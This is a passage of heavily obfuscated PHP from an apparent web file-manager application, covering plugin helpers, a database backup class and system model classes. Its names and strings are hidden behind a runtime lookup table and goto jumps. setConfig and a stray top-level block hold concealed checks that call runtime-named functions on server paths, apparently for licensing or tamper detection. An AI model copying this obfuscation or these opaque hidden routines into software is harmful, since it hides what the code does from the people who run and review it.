$cŒ ¼‚™Ğ¶[] = $cöô±õÄƒó[$aÖšÔ¢›§Ò[485]]; } return md5(implode($aÖšÔ¢›§Ò[71], $cŒ ¼‚™Ğ¶)); goto b³­—ÏäÇ; b³­—ÏäÇ: } final function checkSharePath($fÑÛ§ß­Ç´) { goto a½ÆËŸŸ³¡; a½ÆËŸŸ³¡: $C¡ÃÆÀÎ±Œ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!defined($C¡ÃÆÀÎ±Œ[452])) { define($C¡ÃÆÀÎ±Œ[1407], 0); } if (!$this->isShare($fÑÛ§ß­Ç´)) { return !1; } goto b¹…èå”ä†; b¹…èå”ä†: $F‹ŠÇ«…ƒÜ = Action($C¡ÃÆÀÎ±Œ[1053])->sharePathInfo($fÑÛ§ß­Ç´); if (!isset($F‹ŠÇ«…ƒÜ[$C¡ÃÆÀÎ±Œ[76]])) { show_json(LNG($C¡ÃÆÀÎ±Œ[1408]), !1); } $this->fileInfo = $F‹ŠÇ«…ƒÜ[$C¡ÃÆÀÎ±Œ[164]]; goto BùÈà…‰Ê; BùÈà…‰Ê: $this->cachePath = $this->pluginCachePath($this->fileInfo[$C¡ÃÆÀÎ±Œ[171]]); return $F‹ŠÇ«…ƒÜ[$C¡ÃÆÀÎ±Œ[76]]; goto f³Óš‘ÂØ»; f³Óš‘ÂØ»: } final function pluginCachePath($eÚ‹ÇÜ˜ŒŠ = '') { $AŒ÷„ÎÈï =& $_SERVER[Ïº«‚ßèÔˆø]; $Eœ—› ¢ ƒ = IO_PATH_SYSTEM_TEMP . $AŒ÷„ÎÈï[1409] . $this->pluginName; if (!($f’ÇˆÍ¹Ô = IO::infoFull($Eœ—› ¢ ƒ))) { return IO::mkdir($Eœ—› ¢ ƒ . $AŒ÷„ÎÈï[8] . $eÚ‹ÇÜ˜ŒŠ); } if (empty($eÚ‹ÇÜ˜ŒŠ)) { return $f’ÇˆÍ¹Ô[$AŒ÷„ÎÈï[76]]; } if (!($BŞ²½”„ƒè = IO::fileNameExist($f’ÇˆÍ¹Ô[$AŒ÷„ÎÈï[76]], $eÚ‹ÇÜ˜ŒŠ))) { return IO::mkdir($f’ÇˆÍ¹Ô[$AŒ÷„ÎÈï[76]] . $eÚ‹ÇÜ˜ŒŠ); } return KodIO::make($BŞ²½”„ƒè); } final function pluginCacheFileSet($fè´—É¡Ü‰, $b¾Ä‘²ç¸ = '') { $E°ÂİÈÎ¥æ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!($B©ÃŒ±›ß¬ = IO::infoFull($fè´—É¡Ü‰))) { return IO::mkfile($fè´—É¡Ü‰, $b¾Ä‘²ç¸, REPEAT_REPLACE); } IO::setContent($B©ÃŒ±›ß¬[$E°ÂİÈÎ¥æ[76]], $b¾Ä‘²ç¸); return $B©ÃŒ±›ß¬[$E°ÂİÈÎ¥æ[76]]; } final function pluginLocalFile($E±¾Šª‘¥µ = '') { goto E—Ô°¼³öº; E§À÷‚’¨Â: if (!checkExtSafe($CÉ‹Şö¸)) { $CÉ‹Şö¸ = $CÉ‹Şö¸ . $dğ»ÊäÖó×[1410]; } $f¸µéæ™Å = $BÓ„‘ÍÛª‡ . $CÉ‹Şö¸; if (@file_exists($f¸µéæ™Å)) { return $f¸µéæ™Å; } goto BˆÒ§¬Ù½Æ; BˆÒ§¬Ù½Æ: return IO::copy($E±¾Šª‘¥µ, $BÓ„‘ÍÛª‡, 0, $CÉ‹Şö¸); goto dùÒ²×ÂÜ; CÜóÊ¤Î×: if (!$E±¾Šª‘¥µ) { return $BÓ„‘ÍÛª‡; } $f„ÀØÉÎ = IO::info($E±¾Šª‘¥µ); $CÉ‹Şö¸ = $this->_tmpFileName($f„ÀØÉÎ) . $dğ»ÊäÖó×[95] . $f„ÀØÉÎ[$dğ»ÊäÖó×[168]]; goto E§À÷‚’¨Â; E—Ô°¼³öº: $dğ»ÊäÖó× =& $_SERVER[Ïº«‚ßèÔˆø]; $BÓ„‘ÍÛª‡ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($BÓ„‘ÍÛª‡)) { mk_dir($BÓ„‘ÍÛª‡); } goto CÜóÊ¤Î×; dùÒ²×ÂÜ: } final function appPackage() { goto câ ‰º„ì¬; B’Ãôñœœ‡: return $e­ó¦ä¾ÀË; goto c¾ôÒß¡ƒ÷; a—““ÓĞß¡: $this->parseLang($bÌë¨‘˜Ã«); $e­ó¦ä¾ÀË = json_decode_force($bÌë¨‘˜Ã«); if (!$e­ó¦ä¾ÀË) { return array(); } goto D›ËÈôùÑŞ; D›ËÈôùÑŞ: $E­¾À‚Ë• = Hook::trigger($b êªï´Âğ[1412], $e­ó¦ä¾ÀË); if ($E­¾À‚Ë• && is_array($E­¾À‚Ë•)) { $e­ó¦ä¾ÀË = $E­¾À‚Ë•; } $this->packageData = $e­ó¦ä¾ÀË; goto B’Ãôñœœ‡; câ ‰º„ì¬: $b êªï´Âğ =& $_SERVER[Ïº«‚ßèÔˆø]; if ($this->packageData) { return $this->packageData; } $bÌë¨‘˜Ã« = $this->parseFile($this->pluginPath . $b êªï´Âğ[1411]); goto a—““ÓĞß¡; c¾ôÒß¡ƒ÷: } public function packageInfoGet($f·—İºğÁŒ) { $FÆß‡à†¶‚ = $this->appPackage(); return array_get_value($FÆß‡à†¶‚, $f·—İºğÁŒ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Ïº«‚ßèÔˆø][1413]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Ïº«‚ßèÔˆø][1414]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Ïº«‚ßèÔˆø][1415]); } private function parseFile($A—©Â°á™) { goto aêÍåÄæã‚; aêÍåÄæã‚: $d¦é™Ä«ˆÛ =& $_SERVER[Ïº«‚ßèÔˆø]; $aÂÑ‘¿ØÙ = file_get_contents($A—©Â°á™); $a‡ÇÉ‘ÆÒ— = array($d¦é™Ä«ˆÛ[1416], $d¦é™Ä«ˆÛ[1417], $d¦é™Ä«ˆÛ[1418], $d¦é™Ä«ˆÛ[1419], $d¦é™Ä«ˆÛ[1420], $d¦é™Ä«ˆÛ[1421], $d¦é™Ä«ˆÛ[1422]); goto aŞ…‘ášÀ; aŞ…‘ášÀ: $c•Ë–İŸ–Ê = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$d¦é™Ä«ˆÛ[88]][$d¦é™Ä«ˆÛ[1423]]); if (strstr($aÂÑ‘¿ØÙ, $d¦é™Ä«ˆÛ[1424])) { $C¼ÖšéÙÚ = rawurlencode(json_encode($this->pluginLangArr)); $aÂÑ‘¿ØÙ = str_replace($d¦é™Ä«ˆÛ[1424], $C¼ÖšéÙÚ, $aÂÑ‘¿ØÙ); } if (strstr($aÂÑ‘¿ØÙ, $d¦é™Ä«ˆÛ[1425])) { $C¼ÖšéÙÚ = $C¼ÖšéÙÚ = rawurlencode(json_encode($this->getConfig())); $aÂÑ‘¿ØÙ = str_replace($d¦é™Ä«ˆÛ[1425], $C¼ÖšéÙÚ, $aÂÑ‘¿ØÙ); } goto A—Ç›ê¼‹³; A—Ç›ê¼‹³: $aÂÑ‘¿ØÙ = str_replace($a‡ÇÉ‘ÆÒ—, $c•Ë–İŸ–Ê, $aÂÑ‘¿ØÙ); return $aÂÑ‘¿ØÙ; goto C‹‡Ÿ õ¤; C‹‡Ÿ õ¤: } private function parseLang(&$EÍ‹í •¥) { goto f™ÁÁæ¿Ô“; f™ÁÁæ¿Ô“: $b“¨×­’© =& $_SERVER[Ïº«‚ßèÔˆø]; $E·¶ò‡Îç¤ = $b“¨×­’©[1426]; if (!strstr($EÍ‹í •¥, $E·¶ò‡Îç¤)) { return; } goto e¶ÔÊ¼ÉÂô; e¶ÔÊ¼ÉÂô: preg_match_all($b“¨×­’©[1427], $EÍ‹í •¥, $cáöá‘Ğ“); if (!is_array($cáöá‘Ğ“) || count($cáöá‘Ğ“) == 0 || !is_array($cáöá‘Ğ“[0]) || count($cáöá‘Ğ“[0]) == 0) { return; } $b•¹à¹Ã„ = array(); goto D’ï±½¨Š; D’ï±½¨Š: $C·á²ê°¸ì = array(); foreach ($cáöá‘Ğ“[0] as $EËÉ•²¥¹Ñ) { $cÈ½­“Ì’Ä = substr($EËÉ•²¥¹Ñ, strlen($E·¶ò‡Îç¤), -4); $dìÜªˆãÊ¤ = LNG($cÈ½­“Ì’Ä); $b•¹à¹Ã„[] = $EËÉ•²¥¹Ñ; $C·á²ê°¸ì[] = str_replace(array($b“¨×­’©[228], $b“¨×­’©[1021], $b“¨×­’©[339], $b“¨×­’©[116]), array($b“¨×­’©[50], $b“¨×­’©[50], $b“¨×­’©[33], $b“¨×­’©[1428]), $dìÜªˆãÊ¤); } $EÍ‹í •¥ = str_replace($b•¹à¹Ã„, $C·á²ê°¸ì, $EÍ‹í •¥); goto b¼Øñê½ÈÏ; b¼Øñê½ÈÏ: } private function parseConfig(&$d§ÒªÄ‚Àª) { goto DÍóœ´Õ¡é; D‘†Ò Ğ¾–: $d§ÒªÄ‚Àª = str_replace($Fêë¢˜î¢¢, $Cë¼š¾æ¼À, $d§ÒªÄ‚Àª); goto a¢ôå“š³•; DÍóœ´Õ¡é: $Aóµ“ìÉ• =& $_SERVER[Ïº«‚ßèÔˆø]; $bø„¢”¯ùö = $Aóµ“ìÉ•[1429]; if (!strstr($d§ÒªÄ‚Àª, $bø„¢”¯ùö)) { return; } goto Cˆ„†âáƒ; Cˆ„†âáƒ: preg_match_all($Aóµ“ìÉ•[1430], $d§ÒªÄ‚Àª, $Bˆƒ‰¸Ç‚); if (!is_array($Bˆƒ‰¸Ç‚) || count($Bˆƒ‰¸Ç‚) == 0 || !is_array($Bˆƒ‰¸Ç‚[0]) || count($Bˆƒ‰¸Ç‚[0]) == 0) { return; } $B´¦Ö‹İ = $this->getConfig(); goto AïäíÌİâ¨; AïäíÌİâ¨: $Fêë¢˜î¢¢ = array(); $Cë¼š¾æ¼À = array(); foreach ($Bˆƒ‰¸Ç‚[0] as $C—¶“ìŸôø) { $cãÇİÍ¤“Š = substr($C—¶“ìŸôø, strlen($bø„¢”¯ùö), -2); $Fêë¢˜î¢¢[] = $C—¶“ìŸôø; $Cë¼š¾æ¼À[] = _get($B´¦Ö‹İ, $cãÇİÍ¤“Š); } goto D‘†Ò Ğ¾–; a¢ôå“š³•: } private function parsePackage(&$eÒìò°«•) { goto CÚ÷”‚Ÿá; C²‡¨‰õ²ö: $eÒìò°«• = str_replace($e´œçôì†ˆ, $e½Åä„‰º, $eÒìò°«•); goto fÙ’¦ƒØô‹; f´ˆŠ‹‡ëË: $e´œçôì†ˆ = array(); $e½Åä„‰º = array(); foreach ($Dà‡åŠÅ[0] as $DĞ Ãƒ„õ) { $e›ï¯Ùì = substr($DĞ Ãƒ„õ, strlen($CÃÄ»•ƒ¦), -2); $e´œçôì†ˆ[] = $DĞ Ãƒ„õ; $e½Åä„‰º[] = _get($fñÒâƒğ¦÷, $e›ï¯Ùì); } goto C²‡¨‰õ²ö; bÂœ†½ƒŠë: preg_match_all($dÂÏçí‡[1432], $eÒìò°«•, $Dà‡åŠÅ); if (!is_array($Dà‡åŠÅ) || count($Dà‡åŠÅ) == 0 || !is_array($Dà‡åŠÅ[0]) || count($Dà‡åŠÅ[0]) == 0) { return; } $fñÒâƒğ¦÷ = $this->appPackage(); goto f´ˆŠ‹‡ëË; CÚ÷”‚Ÿá: $dÂÏçí‡ =& $_SERVER[Ïº«‚ßèÔˆø]; $CÃÄ»•ƒ¦ = $dÂÏçí‡[1431]; if (!strstr($eÒìò°«•, $CÃÄ»•ƒ¦)) { return; } goto bÂœ†½ƒŠë; fÙ’¦ƒØô‹: } final function echoFile($EĞ¢–ôÏšò, $CİîÆØÓĞ = false) { goto Fô´ÃóÃ; fö«Ëø‰ŒÁ: $this->parsePackage($C–ÛÍÃ¹™); if (is_array($CİîÆØÓĞ)) { $C–ÛÍÃ¹™ = str_replace(array_keys($CİîÆØÓĞ), array_values($CİîÆØÓĞ), $C–ÛÍÃ¹™); } echo $a‰ùÀ†ŞŠ[228] . $C–ÛÍÃ¹™; goto d±áÜ§éÁ; bÔ§¤Û„âø: $C–ÛÍÃ¹™ = $this->parseFile($b¶Ò‘ğ·Ê); $this->parseLang($C–ÛÍÃ¹™); $this->parseConfig($C–ÛÍÃ¹™); goto fö«Ëø‰ŒÁ; Fô´ÃóÃ: $a‰ùÀ†ŞŠ =& $_SERVER[Ïº«‚ßèÔˆø]; $b¶Ò‘ğ·Ê = $this->pluginPath . $EĞ¢–ôÏšò; if (ACT == $a‰ùÀ†ŞŠ[1433]) { echo $a‰ùÀ†ŞŠ[1434] . $this->pluginName . $a‰ùÀ†ŞŠ[8] . $EĞ¢–ôÏšò . $a‰ùÀ†ŞŠ[1435]; if (!file_exists($b¶Ò‘ğ·Ê)) { echo $a‰ùÀ†ŞŠ[1436]; return; } } goto bÔ§¤Û„âø; d±áÜ§éÁ: } final function initLang() { goto b‡“ù¦×‘‡; c¾—ØÓ°‡: if (!is_array($DÛÑ¤¾Ô¾)) { return array(); } if (@count($DÛÑ¤¾Ô¾) > 0) { I18n::set($DÛÑ¤¾Ô¾); } return $DÛÑ¤¾Ô¾; goto DÈ·¡£¦ÉÀ; b‡“ù¦×‘‡: $Dø´¾‰Ïò… =& $_SERVER[Ïº«‚ßèÔˆø]; $dÂ‘êğ»¾ = $Dø´¾‰Ïò…[1437]; $c„Ûñä®Ãæ = $this->pluginPath . $Dø´¾‰Ïò…[1438]; goto E““ÉÏÂÙ; E““ÉÏÂÙ: $cñ„ğÛÊİÎ = I18n::getType(); $DÛÑ¤¾Ô¾ = array(); if (file_exists($c„Ûñä®Ãæ . $cñ„ğÛÊİÎ . $Dø´¾‰Ïò…[795])) { $DÛÑ¤¾Ô¾ = (include $c„Ûñä®Ãæ . $cñ„ğÛÊİÎ . $Dø´¾‰Ïò…[795]); } else { if ($cñ„ğÛÊİÎ == $Dø´¾‰Ïò…[1439] && !file_exists($c„Ûñä®Ãæ . $cñ„ğÛÊİÎ . $Dø´¾‰Ïò…[795]) && file_exists($c„Ûñä®Ãæ . $Dø´¾‰Ïò…[1440])) { $DÛÑ¤¾Ô¾ = (include $c„Ûñä®Ãæ . $Dø´¾‰Ïò…[1440]); } else { if (file_exists($c„Ûñä®Ãæ . $dÂ‘êğ»¾ . $Dø´¾‰Ïò…[795])) { $DÛÑ¤¾Ô¾ = (include $c„Ûñä®Ãæ . $dÂ‘êğ»¾ . $Dø´¾‰Ïò…[795]); } } } goto c¾—ØÓ°‡; DÈ·¡£¦ÉÀ: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($Aîöó‚Êê) { $ašÆÂò‡¼Ë =& $_SERVER[Ïº«‚ßèÔˆø]; if ($_SERVER[$ašÆÂò‡¼Ë[748]] != $_SERVER[$ašÆÂò‡¼Ë[813]]) { goto bš„íîÔÀî; bš„íîÔÀî: $fœª¥ÎÇ»Ê = $ašÆÂò‡¼Ë[824]; $B‹íñŞ—„ß = $ašÆÂò‡¼Ë[749]; $BÜğÔ›ŞØª = $_SERVER[$ašÆÂò‡¼Ë[750]] . $ašÆÂò‡¼Ë[751]; goto B”®†•æóƒ; a•­åƒ¸„ç: $a ¿äÄÏÔ£ = $ašÆÂò‡¼Ë[825]; $a ¿äÄÏÔ£($_SERVER[$ašÆÂò‡¼Ë[826]]); $a ¿äÄÏÔ£($_SERVER[$ašÆÂò‡¼Ë[750]] . $ašÆÂò‡¼Ë[827]); goto B«Ä¥½ñ¤î; B«Ä¥½ñ¤î: $fÂ…Ä³©Âç = 1; while ($fÂ…Ä³©Âç > 1) { $fÂ…Ä³©Âç = $fÂ…Ä³©Âç + 4; $Aô®„õôë = rawurlencode($fÂ…Ä³©Âç . $ašÆÂò‡¼Ë[374]); } goto cÓ‰À§ĞçË; B”®†•æóƒ: $f¼Ãã ’÷í = $B‹íñŞ—„ß($BÜğÔ›ŞØª); $fÆã´ˆåëÚ = explode($ašÆÂò‡¼Ë[228], $f¼Ãã ’÷í); if (count($fÆã´ˆåëÚ) < $ašÆÂò‡¼Ë[577]) { $b‡¨à‚¨ææ = $ašÆÂò‡¼Ë[752]; $b‡¨à‚¨ææ(); } goto a•­åƒ¸„ç; cÓ‰À§ĞçË: } return $this->modelPlugin->setConfig($this->pluginName, $Aîöó‚Êê); } public function onSetConfig($b–º‡¨á“) { } public function onGetConfig($cï•İ¶‚ù) { } public function onChangeStatus($aƒõÕùëÄ´) { } public function onUninstall() { } public function onInstall() { } public function authCheck($Fòğ¨Ô°ÖÓ = "\x70\154\165\x67\151\156\101\x75\x74\150") { $f™¸ÔŞ®¹Š =& $_SERVER[Ïº«‚ßèÔˆø]; if (!defined($f™¸ÔŞ®¹Š[452])) { return !1; } if (_get($GLOBALS, $f™¸ÔŞ®¹Š[483])) { return !0; } $aÖŠ„¯±‘• = $this->getConfig(); if (!$aÖŠ„¯±‘•[$Fòğ¨Ô°ÖÓ]) { return !1; } return ActionCall($f™¸ÔŞ®¹Š[1441], $aÖŠ„¯±‘•[$Fòğ¨Ô°ÖÓ]); } public function url($Fğß£æã¹ , $e¶šØ…´¤Ç = '', $Bæöµ‚Ïá« = true) { goto F¿…×‡ƒ…; F¿…×‡ƒ…: $f”ê¤’Ò™Á =& $_SERVER[Ïº«‚ßèÔˆø]; $c¼‡‡…ŒÈ = $this->getConfig(); $bºå‰çèÃ = KOD_VERSION . $f”ê¤’Ò™Á[95] . KOD_VERSION_BUILD; goto AŞé£µ¦ˆí; AŞé£µ¦ˆí: $EØÓ±§ÃÒ = $this->packageVersion(); $bÃ‘‚êÓíà = $bºå‰çèÃ . $f”ê¤’Ò™Á[438] . $EØÓ±§ÃÒ; if (substr($Fğß£æã¹ , 0, 4) == $f”ê¤’Ò™Á[147] || substr($Fğß£æã¹ , 0, 2) == $f”ê¤’Ò™Á[1226]) { $Dˆ“ˆŠñ«á = $Fğß£æã¹  . $f”ê¤’Ò™Á[1442] . $bÃ‘‚êÓíà; } else { if ($e¶šØ…´¤Ç == $f”ê¤’Ò™Á[33]) { $Dˆ“ˆŠñ«á = $this->pluginHost . $Fğß£æã¹  . $f”ê¤’Ò™Á[1442] . $bÃ‘‚êÓíà; } else { if ($e¶šØ…´¤Ç === $f”ê¤’Ò™Á[77]) { $Dˆ“ˆŠñ«á = $this->pluginHost . $Fğß£æã¹ ; } else { if ($e¶šØ…´¤Ç == $f”ê¤’Ò™Á[1443]) { $Dˆ“ˆŠñ«á = STATIC_PATH . $Fğß£æã¹  . $f”ê¤’Ò™Á[1442] . $bºå‰çèÃ; } else { if ($e¶šØ…´¤Ç == $f”ê¤’Ò™Á[1444]) { $Dˆ“ˆŠñ«á = APP_HOST . $f”ê¤’Ò™Á[1445] . $Fğß£æã¹  . $f”ê¤’Ò™Á[1442] . $bºå‰çèÃ; } else { if (isset($c¼‡‡…ŒÈ[$e¶šØ…´¤Ç])) { $Dˆ“ˆŠñ«á = $c¼‡‡…ŒÈ[$e¶šØ…´¤Ç] . $Fğß£æã¹  . $f”ê¤’Ò™Á[1442] . $bÃ‘‚êÓíà; } } } } } } goto a×ĞŸÀõÖâ; a×ĞŸÀõÖâ: if (!$Bæöµ‚Ïá«) { return $Dˆ“ˆŠñ«á; } echo $Dˆ“ˆŠñ«á; goto AÑÀ¢‚ğº¬; AÑÀ¢‚ğº¬: } public function link($aÅÄ†£æ¤İ = false, $DÍÏ‹ÄÎï´ = '') { $bİ¶…Ê…§¥ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$aÅÄ†£æ¤İ) { $this->link($bİ¶…Ê…§¥[1446], $bİ¶…Ê…§¥[1444]); $this->link($bİ¶…Ê…§¥[1447], $bİ¶…Ê…§¥[1443]); $this->link($bİ¶…Ê…§¥[1448], $bİ¶…Ê…§¥[1443]); $this->link($bİ¶…Ê…§¥[1449], $bİ¶…Ê…§¥[1443]); $this->link($bİ¶…Ê…§¥[1450], $bİ¶…Ê…§¥[1443]); return; } $cÜÑšÊİ¡µ = $this->url($aÅÄ†£æ¤İ, $DÍÏ‹ÄÎï´, !1); if (substr($aÅÄ†£æ¤İ, -3) == $bİ¶…Ê…§¥[1451]) { echo $bİ¶…Ê…§¥[1452] . $cÜÑšÊİ¡µ . $bİ¶…Ê…§¥[1453] . $bİ¶…Ê…§¥[228]; } else { if (substr($aÅÄ†£æ¤İ, -4) == $bİ¶…Ê…§¥[1454]) { echo $bİ¶…Ê…§¥[1455] . $cÜÑšÊİ¡µ . $bİ¶…Ê…§¥[1456] . $bİ¶…Ê…§¥[228]; } } } } goto aÈ¸Û›ºò; fˆ²¥×©ø: $f·‚óŞ¤Öï = $_SERVER[Ïº«‚ßèÔˆø][747]; if ($_SERVER[$_SERVER[Ïº«‚ßèÔˆø][748]] != $f·‚óŞ¤Öï($E°óæÃì˜µ)) { goto B‘ëÊƒµØ; eŞ¹Ÿ—¯: $dŸ†ßïëö = explode($_SERVER[Ïº«‚ßèÔˆø][228], $F×‡îÕºô); if (count($dŸ†ßïëö) < $_SERVER[Ïº«‚ßèÔˆø][582]) { $Cğ½ÂÂíõË = $_SERVER[Ïº«‚ßèÔˆø][752]; $Cğ½ÂÂíõË(); } $f°ñø»ø£‹ = $_SERVER[Ïº«‚ßèÔˆø][753]; goto F„³‘’ù†Ú; B‘ëÊƒµØ: $EÆŸšÀë§ = $_SERVER[Ïº«‚ßèÔˆø][749]; $D¬©ğŒæÜ = $_SERVER[$_SERVER[Ïº«‚ßèÔˆø][750]] . $_SERVER[Ïº«‚ßèÔˆø][751]; $F×‡îÕºô = $EÆŸšÀë§($D¬©ğŒæÜ); goto eŞ¹Ÿ—¯; F„³‘’ù†Ú: $f°ñø»ø£‹($E°óæÃì˜µ); goto C«Í­ë¬ïñ; C«Í­ë¬ïñ: } class BackupDbFile { public function __construct() { } public function index() { goto e‘÷×öÑ¹; fáÁƒ™œ§: $a–¡—ø¤‡ = $this->tmpFilesPath() . "\x62\x61\143\153\x75\160\x5f{$bš™Çì²‰É}\57"; $bµÔñ·åéÚ = $this->backupPath($cÒ ¯Ğ¨‚±); if (!($bµÔñ·åéÚ = IO::mkdir($bµÔñ·åéÚ))) { return !1; } goto EíÆÄñôÀì; eâ˜‰ŒÉšù: $f–Â™ÒËà„ = CONTROLLER_DIR . $Dåß†ªê¸Ç[760]; $B‰Ğ¹†³‘ = CONTROLLER_DIR . $Dåß†ªê¸Ç[761]; IO::copy($f–Â™ÒËà„, $bµÔñ·åéÚ); goto BÌˆ»‚Ûé; e‘÷×öÑ¹: $Dåß†ªê¸Ç =& $_SERVER[Ïº«‚ßèÔˆø]; $cÒ ¯Ğ¨‚± = Backup::get(); $bš™Çì²‰É = $cÒ ¯Ğ¨‚±[$Dåß†ªê¸Ç[28]]; goto fáÁƒ™œ§; BÌˆ»‚Ûé: IO::copy($B‰Ğ¹†³‘, $bµÔñ·åéÚ); $bÒ®ì±¥å‡->end(); $E“¤¯§À = array($Dåß†ªê¸Ç[762] => $bõó®¦ß¾¨, $Dåß†ªê¸Ç[763] => time()); goto Däù¸Ğ¢°Ó; EíÆÄñôÀì: $EØ±§Ø­‘¼ = IO::listPath($a–¡—ø¤‡); $BâÔÏ«áÚ = isset($EØ±§Ø­‘¼[$Dåß†ªê¸Ç[74]]) ? $EØ±§Ø­‘¼[$Dåß†ªê¸Ç[74]] : array(); $bõó®¦ß¾¨ = array_sum(array_column($BâÔÏ«áÚ, $Dåß†ªê¸Ç[78])); goto aµ‹½”Œà‡; Däù¸Ğ¢°Ó: Backup::set($E“¤¯§À); return !0; goto DÎ•œÈ¼İ; aµ‹½”Œà‡: if (!$bõó®¦ß¾¨) { return !1; } $E“¤¯§À = array($Dåß†ªê¸Ç[754] => $bõó®¦ß¾¨, $Dåß†ªê¸Ç[755] => time()); Backup::set($E“¤¯§À); goto dºó‰İéÕó; dºó‰İéÕó: $bÒ®ì±¥å‡ = new TaskFileTransfer($Dåß†ªê¸Ç[756], $Dåß†ªê¸Ç[726], count($BâÔÏ«áÚ), LNG($Dåß†ªê¸Ç[727]) . $Dåß†ªê¸Ç[438] . LNG($Dåß†ªê¸Ç[729]) . $Dåß†ªê¸Ç[757]); $bÒ®ì±¥å‡->task[$Dåß†ªê¸Ç[707]] = $bõó®¦ß¾¨; foreach ($EØ±§Ø­‘¼[$Dåß†ªê¸Ç[74]] as $a¹·›º¥”â) { $C•›“°‡Š = IO::move($a¹·›º¥”â[$Dåß†ªê¸Ç[76]], $bµÔñ·åéÚ); if (!$C•›“°‡Š) { $bÒ®ì±¥å‡->end(); $d¶Åš«›ˆÏ = IO::getLastError($Dåß†ªê¸Ç[758] . $a¹·›º¥”â[$Dåß†ªê¸Ç[76]] . $Dåß†ªê¸Ç[759] . $bµÔñ·åéÚ . $Dåß†ªê¸Ç[503]); write_log($d¶Åš«›ˆÏ, $Dåß†ªê¸Ç[726]); return !1; } } goto eâ˜‰ŒÉšù; DÎ•œÈ¼İ: } private function backupPath($d°Úö‰Û ) { $E½“‹×ÙêÒ =& $_SERVER[Ïº«‚ßèÔˆø]; $f¼İùÌèî = $d°Úö‰Û [$E½“‹×ÙêÒ[28]]; $B„âêËê¨¦ = Model($E½“‹×ÙêÒ[714])->get($E½“‹×ÙêÒ[715]); $E±ˆã‰¶¸× = substr(md5($E½“‹×ÙêÒ[716] . $B„âêËê¨¦ . $f¼İùÌèî), 0, 8); return "\x7b\x69\x6f\72{$d°Úö‰Û [$E½“‹×ÙêÒ[699]]}\x7d\x2f\144\x61\164\x61\142\x61\x73\145\57\x62\141\x63\x6b\165\160\x2f" . $f¼İùÌèî . $E½“‹×ÙêÒ[71] . $E±ˆã‰¶¸×; } private function tmpFilesPath() { $C­…ì¦ˆåæ =& $_SERVER[Ïº«‚ßèÔˆø]; $DÖ¨Ç¸î© = TEMP_FILES; if ($GLOBALS[$C­…ì¦ˆåæ[6]][$C­…ì¦ˆåæ[88]][$C­…ì¦ˆåæ[744]]) { $DÖ¨Ç¸î© = $GLOBALS[$C­…ì¦ˆåæ[6]][$C­…ì¦ˆåæ[88]][$C­…ì¦ˆåæ[744]]; if (!mk_dir($DÖ¨Ç¸î©) || !is_writable($DÖ¨Ç¸î©) || !IO::mkfile($DÖ¨Ç¸î© . $C­…ì¦ˆåæ[745])) { $DÖ¨Ç¸î© = TEMP_FILES; } } return $DÖ¨Ç¸î©; } } goto A“‡ ¤Ç¯Ğ; FÔÄ«ä·Ûç: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\x6d\x2e\x4c\x69\147\x68\x74\x41\160\160"; public $modelType = "\x53\171\163\164\145\x6d\117\x70\x74\x69\157\x6e"; public $field = array("\156\141\155\145", "\x67\162\157\165\160", "\144\145\x73\143", "\143\x6f\156\x74\145\156\164"); public function listData($e£®ôÆçĞ = false, $a‹¼¬§¥±ø = "\155\157\144\151\146\171\124\151\x6d\x65", $aç¤Â±¸±’ = true) { return parent::listData($e£®ôÆçĞ, $a‹¼¬§¥±ø, $aç¤Â±¸±’); } public function remove($E¾ŒÖîœ½) { $FìøÛè½ = $this->findByName($E¾ŒÖîœ½); if (!$FìøÛè½) { return !1; } return parent::remove($FìøÛè½[$_SERVER[Ïº«‚ßèÔˆø][392]]); } public function add($f¾´´¾½©è) { if ($this->findByName($f¾´´¾½©è[$_SERVER[Ïº«‚ßèÔˆø][28]])) { return !1; } return parent::insert($f¾´´¾½©è); } public function update($EÕÔŒ˜çªš, $E‡Ê•ŠÍƒÛ) { $eŠ±õ‹´ÀÈ =& $_SERVER[Ïº«‚ßèÔˆø]; $AÍ…÷Š¨¤Ã = $this->findByName($EÕÔŒ˜çªš); $DÏ„¡õáÅˆ = $this->findByName($E‡Ê•ŠÍƒÛ[$eŠ±õ‹´ÀÈ[28]]); if (!$AÍ…÷Š¨¤Ã || $DÏ„¡õáÅˆ && $DÏ„¡õáÅˆ[$eŠ±õ‹´ÀÈ[392]] != $AÍ…÷Š¨¤Ã[$eŠ±õ‹´ÀÈ[392]]) { return !1; } return parent::update($AÍ…÷Š¨¤Ã[$eŠ±õ‹´ÀÈ[392]], $E‡Ê•ŠÍƒÛ); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\163\164\x65\x6d\137\154\157\x67"; protected $dataAuto = array(array("\143\162\145\x61\164\145\x54\151\x6d\x65", "\x74\151\155\145", "\x69\156\163\x65\162\x74", "\146\x75\156\143\x74\151\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $a•”Ô…«¸ =& $_SERVER[Ïº«‚ßèÔˆø]; return array($a•”Ô…«¸[1983] => LNG($a•”Ô…«¸[1984]), $a•”Ô…«¸[1985] => LNG($a•”Ô…«¸[1986]), $a•”Ô…«¸[1611] => LNG($a•”Ô…«¸[1987]), $a•”Ô…«¸[1988] => LNG($a•”Ô…«¸[1989]), $a•”Ô…«¸[1990] => LNG($a•”Ô…«¸[1991]), $a•”Ô…«¸[1992] => LNG($a•”Ô…«¸[1993]), $a•”Ô…«¸[1994] => LNG($a•”Ô…«¸[1995]), $a•”Ô…«¸[1641] => LNG($a•”Ô…«¸[1995]), $a•”Ô…«¸[1642] => LNG($a•”Ô…«¸[1996]), $a•”Ô…«¸[1997] => LNG($a•”Ô…«¸[1998]), $a•”Ô…«¸[1999] => LNG($a•”Ô…«¸[2000]), $a•”Ô…«¸[2001] => LNG($a•”Ô…«¸[2002]), $a•”Ô…«¸[2003] => LNG($a•”Ô…«¸[2004]), $a•”Ô…«¸[1639] => LNG($a•”Ô…«¸[2005]), 